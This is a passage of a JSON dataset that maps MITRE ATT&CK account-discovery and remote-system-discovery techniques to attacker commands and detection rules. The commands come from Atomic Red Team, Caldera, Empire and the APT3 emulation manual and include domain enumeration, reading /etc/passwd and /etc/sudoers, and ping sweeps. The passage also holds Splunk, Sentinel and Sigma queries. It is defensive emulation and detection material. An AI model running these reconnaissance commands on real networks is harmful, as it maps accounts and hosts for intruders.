{"cmd": {"command": "net user /domain"}}}}}, {"Threat Hunting Tables": {"chain_id": "100137", "os": "windows", "parent_process": "Net.exe", "commandline_string": "localgroup \"administrators\"", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100138", "os": "windows", "parent_process": "Net.exe", "commandline_string": "group \"domain admins\" /domain", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100139", "os": "windows", "parent_process": "Net.exe", "commandline_string": "user * /domain", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100140", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "useraccount get /ALL", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100141", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "useraccount list", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100142", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "qfe get description,installedOn /format:csv", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100143", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "process get caption,executablepath,commandline", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100144", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "service get name,displayname,pathname,startmode", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100145", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "share list", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100146", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "/node:\"192.168.0.1\" service where (caption like \"%sql server (%\")", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100147", "os": "windows", "parent_process": "wmic.exe", "commandline_string": "get-wmiobject -class \"win32_share\" -namespace \"root\\CIMV2\" -computer \"targetname\"", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100215", "os": "windows", "parent_process": "nltest.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "account_discovery", "mitre_attack": "T1087", "itw_sample": "https://www.hybrid-analysis.com/sample/43bc3efd795f4a1e84f9017f6b39ab331614665b4998e6c806dc8d0417ec314f?environmentId=100"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/get_domain_sid", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/management/get_domain_sid\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/sid_to_user", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/management/sid_to_user\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/management/user_to_sid", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/management/user_to_sid\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/get_spn", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/get_spn\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/find_foreign_group", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_foreign_group\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/find_foreign_user", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_foreign_user\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/find_gpo_computer_admin", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_gpo_computer_admin\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/find_gpo_location", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_gpo_location\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/find_localadmin_access", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_localadmin_access\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/find_managed_security_group", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/find_managed_security_group\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_gpo_computer", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_gpo_computer\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_group", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_group\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_group_member", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_group_member\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_localgroup", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_localgroup\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_loggedon", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "T1033", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_loggedon\":  [\"T1087\",\"T1033\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_ou", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_ou\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/get_user", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/get_user\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/situational_awareness/network/powerview/user_hunter", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"powershell/situational_awareness/network/powerview/user_hunter\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/dscl_get_groupmembers", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/dscl_get_groupmembers\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/dscl_get_groups", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/dscl_get_groups\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/dscl_get_users", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/dscl_get_users\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/get_groupmembers", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_groupmembers\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/get_groupmemberships", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_groupmemberships\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/get_groups", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_groups\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/get_ous", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_ous\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/get_userinformation", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_userinformation\":  [\"T1087\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "python/situational_awareness/network/active_directory/get_users", "ATT&CK Technique #1": "T1087", "ATT&CK Technique #2": "", "Technique": "Account Discovery", "Concatenate for Python Dictionary": "\"python/situational_awareness/network/active_directory/get_users\":  [\"T1087\"],"}}], "command_list": ["net user [username] [/domain]", "shell net user [username] [/domain]", "post/windows/gather/enum_ad_users\nauxiliary/scanner/smb/smb_enumusers", "dsquery group \"ou=Domain Admins,dc=domain,dc=com\"\ndsquery user \"dc=domain,dc=com\"\ndsquery * OU=\"Domain Admins\",DC=domain,DC=com -scope base -attr SAMAccountName userPrincipalName Description\ndsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\ndsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "shell dsquery group \"out=Domain Admins\",dc=domain,dc=com\"\nshell dsquery user \"dc=domain,dc=com\"\nshell dsquery * OU=\"Domain Admins\",dc=domain,dc=com -scope base -attr SAMAccountName userPrincipleName Description\nshell dsquery * -filter \"(&(objectCategory=contact)(objectCategory=person)(mail=*)(objectClass=user))\" -Attr samAccountName mail -Limit 0\nshell dsquery * -filter \"(&(objectCategory=group)(name=*Admin*))\" -Attr name description members", "cat /etc/passwd > /tmp/T1087.txt\ncat /tmp/T1087.txt\n", "cat /etc/sudoers > /tmp/T1087.txt\ncat /tmp/T1087.txt\n", "grep 'x:0:' /etc/passwd > /tmp/T1087.txt\ncat /tmp/T1087.txt 2>/dev/null\n", "username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username\n", "lastlog > /tmp/T1087.txt\ncat /tmp/T1087.txt\n", "groups\nid\n", "dscl . list /Groups\ndscl . list /Users\ndscl . list /Users | grep -v '_'\ndscacheutil -q group\ndscacheutil -q user\n", "net user\nnet user /domain\ndir c:\\Users\\\ncmdkey.exe /list\nnet localgroup \"Users\"\nnet localgroup\n", "net user\nnet user /domain\nget-localuser\nget-localgroupmember -group Users\ncmdkey.exe /list\nls C:/Users\nget-childitem C:\\Users\\\ndir C:\\Users\\\nget-aduser -filter *\nget-localgroup\nnet localgroup\n", "query user\n", "query user\n", {"windows": {"cmd,psh": {"command": "net user #{domain.user.name} /domain"}}}, {"darwin": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}, "linux": {"sh": {"command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "host.user.name"}]}}}}, {"windows": {"cmd": {"command": "net user /domain"}}}, "Net.exe localgroup \"administrators\"", "Net.exe group \"domain admins\" /domain", "Net.exe user * /domain", "wmic.exe useraccount get /ALL", "wmic.exe useraccount list", "wmic.exe qfe get description,installedOn /format:csv", "wmic.exe process get caption,executablepath,commandline", "wmic.exe service get name,displayname,pathname,startmode", "wmic.exe share list", "wmic.exe /node:\"192.168.0.1\" service where (caption like \"%sql server (%\")", "wmic.exe get-wmiobject -class \"win32_share\" -namespace \"root\\CIMV2\" -computer \"targetname\"", "nltest.exe", "powershell/management/get_domain_sid", "powershell/management/get_domain_sid", "powershell/management/sid_to_user", "powershell/management/sid_to_user", "powershell/management/user_to_sid", "powershell/management/user_to_sid", "powershell/situational_awareness/network/get_spn", "powershell/situational_awareness/network/get_spn", "powershell/situational_awareness/network/powerview/find_foreign_group", "powershell/situational_awareness/network/powerview/find_foreign_group", "powershell/situational_awareness/network/powerview/find_foreign_user", "powershell/situational_awareness/network/powerview/find_foreign_user", "powershell/situational_awareness/network/powerview/find_gpo_computer_admin", "powershell/situational_awareness/network/powerview/find_gpo_computer_admin", "powershell/situational_awareness/network/powerview/find_gpo_location", "powershell/situational_awareness/network/powerview/find_gpo_location", "powershell/situational_awareness/network/powerview/find_localadmin_access", "powershell/situational_awareness/network/powerview/find_localadmin_access", "powershell/situational_awareness/network/powerview/find_managed_security_group", "powershell/situational_awareness/network/powerview/find_managed_security_group", "powershell/situational_awareness/network/powerview/get_gpo_computer", "powershell/situational_awareness/network/powerview/get_gpo_computer", "powershell/situational_awareness/network/powerview/get_group", "powershell/situational_awareness/network/powerview/get_group", "powershell/situational_awareness/network/powerview/get_group_member", "powershell/situational_awareness/network/powerview/get_group_member", "powershell/situational_awareness/network/powerview/get_localgroup", "powershell/situational_awareness/network/powerview/get_localgroup", "powershell/situational_awareness/network/powerview/get_loggedon", "powershell/situational_awareness/network/powerview/get_loggedon", "powershell/situational_awareness/network/powerview/get_ou", "powershell/situational_awareness/network/powerview/get_ou", "powershell/situational_awareness/network/powerview/get_user", "powershell/situational_awareness/network/powerview/get_user", "powershell/situational_awareness/network/powerview/user_hunter", "powershell/situational_awareness/network/powerview/user_hunter", "python/situational_awareness/network/active_directory/dscl_get_groupmembers", "python/situational_awareness/network/active_directory/dscl_get_groupmembers", "python/situational_awareness/network/active_directory/dscl_get_groups", "python/situational_awareness/network/active_directory/dscl_get_groups", "python/situational_awareness/network/active_directory/dscl_get_users", "python/situational_awareness/network/active_directory/dscl_get_users", "python/situational_awareness/network/active_directory/get_groupmembers", "python/situational_awareness/network/active_directory/get_groupmembers", "python/situational_awareness/network/active_directory/get_groupmemberships", "python/situational_awareness/network/active_directory/get_groupmemberships", "python/situational_awareness/network/active_directory/get_groups", "python/situational_awareness/network/active_directory/get_groups", "python/situational_awareness/network/active_directory/get_ous", "python/situational_awareness/network/active_directory/get_ous", "python/situational_awareness/network/active_directory/get_userinformation", "python/situational_awareness/network/active_directory/get_userinformation", "python/situational_awareness/network/active_directory/get_users", "python/situational_awareness/network/active_directory/get_users", "Atomic Test #1 - Enumerate all accounts", "cat /etc/passwd > #{output_file}", "Atomic Test #2 - View sudoers access", "cat /etc/sudoers > #{output_file}", "Atomic Test #3 - View accounts with UID 0", "username=$(echo $HOME | awk -F'/' '{print $3}') && lsof -u $username", "lsof $USER", "Atomic Test #4 - Show if a user account has ever logger in remotely", "lastlog > #{output_file}", "Atomic Test #5 - Enumerate users and groups", "groups", "id"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"net.exe\"or process_path contains \"powershell.exe\")and (process_command_line contains \"*net* user*\"or process_command_line contains \"*net* group*\"or process_command_line contains \"*net* localgroup*\"or process_command_line contains \"cmdkey*\\\\/list*\"or process_command_line contains \"*get-localuser*\"or process_command_line contains \"*get-localgroupmembers*\"or process_command_line contains \"*get-aduser*\"or process_command_line contains \"query*user*\")", "name": "Account Discovery"}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history cat /etc/passwd | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history cat /etc/sudoers | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history \"lsof -u *\" | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history lastlog | table host,user_name,bash_command", "name": null}, {"product": "Splunk", "query": "index=linux sourcetype=bash_history group OR id | table host,user_name,bash_command", "name": null}], "possible_detections": [{"data_source": "bash_history logs"}, {"data_source": {"title": "AD Privileged Users or Groups Reconnaissance", "id": "35ba1d85-724d-42a3-889f-2e2362bcaf23", "description": "Detect priv users or groups recon based on 4661 eventid and known privileged users or groups SIDs", "references": ["https://blog.menasec.net/2019/02/threat-hunting-5-detecting-enumeration.html"], "tags": ["attack.discovery", "attack.t1087"], "status": "experimental", "author": "Samir Bousseaden", "logsource": {"product": "windows", "service": "security", "definition": "Requirements: enable Object Access SAM on your Domain Controllers"}, "detection": {"selection": {"EventID": 4661, "ObjectType": ["SAM_USER", "SAM_GROUP"], "ObjectName": ["*-512", "*-502", "*-500", "*-505", "*-519", "*-520", "*-544", "*-551", "*-555", "*admin*"]}, "condition": "selection"}, "falsepositives": ["if source account name is not an admin then its super suspicious"], "level": "high"}}, {"data_source": {"title": "Local Accounts Discovery", "id": "502b42de-4306-40b4-9596-6f590c81f073", "status": "experimental", "description": "Local accounts, System Owner/User discovery using operating systems utilities", "author": "Timur Zinniatullin, Daniil Yugoslavskiy, oscd.community", "date": "2019/10/21", "modified": "2019/11/04", "references": ["https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1033/T1033.yaml"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection_1": [{"Image|endswith": "\\whoami.exe"}, {"Image|endswith": "\\wmic.exe", "CommandLine|contains|all": ["useraccount", "get"]}, {"Image|endswith": ["\\quser.exe", "\\qwinsta.exe"]}, {"Image|endswith": "\\cmdkey.exe", "CommandLine|contains": "/list"}, {"Image|endswith": "\\cmd.exe", "CommandLine|contains|all": ["/c", "dir", "\\Users\\"]}], "selection_2": {"Image|endswith": ["\\net.exe", "\\net1.exe"], "CommandLine|contains": "user"}, "filter": {"CommandLine|contains": ["/domain", "/add", "/delete", "/active", "/expires", "/passwordreq", "/scriptpath", "/times", "/workstations"]}, "condition": "selection_1 or ( selection_2 and not filter )"}, "fields": ["Image", "CommandLine", "User", "LogonGuid", "Hashes", "ParentProcessGuid", "ParentCommandLine"], "falsepositives": ["Legitimate administrator or user enumerates local users for legitimate reason"], "level": "low", "tags": ["attack.discovery", "attack.t1033", "attack.t1087"]}}, {"data_source": {"title": "Suspicious Reconnaissance Activity", "id": "d95de845-b83c-4a9a-8a6a-4fc802ebf6c0", "status": "experimental", "description": "Detects suspicious command line activity on Windows systems", "author": "Florian Roth", "tags": ["attack.discovery", "attack.t1087"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["net group \"domain admins\" /domain", "net localgroup administrators"]}, "condition": "selection"}, "fields": ["CommandLine", "ParentCommandLine"], "falsepositives": ["Inventory tool runs", "Penetration tests", "Administrative activity"], "analysis": {"recommendation": "Check if the user that executed the commands is suspicious (e.g. service accounts, LOCAL_SYSTEM)"}, "level": "medium"}}]}, {"technique_id": "T1018", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group \"Domain Computers\" /domain[:DOMAIN]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group \"Domain Computers\" /domain", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "\npost/windows/gather/enum_ad_computers\npost/windows/gather/enum_computers", "name": "Metasploit"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group \"Domain Controllers\" /domain[:DOMAIN]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "net group \"Domain Controllers\" /domain", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "nltest /dclist[:domain]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "echo %LOGONSERVER%", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell echo %LOGONSERVER%", "name": "Cobalt Strike"}, {"source": "atomics/T1018/T1018.yaml", "command": "net view /domain\nnet view\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "net group \"Domain Computers\" /domain\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "nltest.exe /dclist:domain.local\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "arp -a\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "arp -a | grep -v '^?'\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done\n", "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": null, "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": null, "name": null}, {"source": "atomics/T1018/T1018.yaml", "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]\n$pieces = $localip.split(\".\")\n$firstOctet = $pieces[0]\n$secondOctet = $pieces[1]\n$thirdOctet = $pieces[2]\nforeach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}\n", "name": null}, {"source": "data/abilities/discovery/13379ae1-d20e-4162-91f8-320d78a35e7f.yml", "command": {"windows": {"psh": {"command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n", "parsers": {"plugins.stockpile.app.parsers.gdomain": [{"source": "remote.host.fqdn"}]}, "payloads": ["powerview.ps1"]}}}, "name": "Use PowerView to query the Active Directory server for a list of computers in the Domain"}, {"source": "data/abilities/discovery/26c8b8b5-7b5b-4de1-a128-7d37fb14f517.yml", "command": {"windows": {"cmd": {"command": "nltest /dsgetdc:%USERDOMAIN%\n"}, "psh": {"command": "nltest /dsgetdc:$env:USERDOMAIN\n"}}}, "name": "Identify the remote domain controllers"}, {"source": "data/abilities/discovery/5f77ecf9-613f-4863-8d2f-ed6b447a4633.yml", "command": {"darwin": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}, "linux": {"sh": {"command": "cat ~/.ssh/known_hosts\n"}}}, "name": "View the known_hosts file"}, {"source": "data/abilities/discovery/85341c8c-4ecb-4579-8f53-43e3e91d7617.yml", "command": {"darwin": {"sh": {"command": "arp -a"}}, "linux": {"sh": {"command": "arp -a"}}, "windows": {"psh,cmd": {"command": "arp -a"}}}, "name": "Locate all active IP and FQDNs on the network"}, {"source": "data/abilities/discovery/b22b3b47-6219-4504-a2e6-ae8263e49fc3.yml", "command": {"windows": {"cmd": {"command": "nltest /dsgetdc:%USERDOMAIN%\n"}, "psh": {"command": "nltest /dsgetdc:$env:USERDOMAIN\n"}}}, "name": "Identify remote domain controller"}, {"source": "data/abilities/discovery/ce485320-41a4-42e8-a510-f5a8fe96a644.yml", "command": {"linux": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "darwin": {"sh": {"command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}, "windows": {"psh": {"command": "(nslookup -querytype=mx #{target.org.domain}. | Select-String -pattern 'mail' | Out-String).Trim()\n", "parsers": {"plugins.stockpile.app.parsers.basic": [{"source": "target.org.emailhost"}]}}}}, "name": "Identify the organizations mail server"}, {"source": "data/abilities/discovery/fa4ed735-7006-4451-a578-b516f80e559f.yml", "command": {"windows": {"psh": {"command": "nslookup #{remote.host.ip}\n", "parsers": {"plugins.stockpile.app.parsers.reverse_nslookup": [{"source": "remote.host.fqdn", "edge": "has_ip", "target": "remote.host.ip"}]}}}}, "name": "Find hostname of remote IP in domain"}, {"source": "data/abilities/discovery/fdf8bf36-797f-4157-805b-fe7c1c6fc903.yml", "command": {"windows": {"psh": {"command": "nbtstat -A #{remote.host.ip}"}}}, "name": "Find hostname of remote host"}, {"source": "Threat Hunting Tables", "command": "net.exe view /domain", "name": null}, {"source": "Threat Hunting Tables", "command": "qwinsta.exe /server:", "name": null}, {"source": "Threat Hunting Tables", "command": "installutil.exe /logfile= /LogToConsole=false /U *.dll", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_controller", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_controller", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_policy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_policy", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_trust", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_domain_trust", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_forest", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_forest", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/situational_awareness/network/powerview/get_forest_domain", "name": "Empire Module Command"}, {"source": 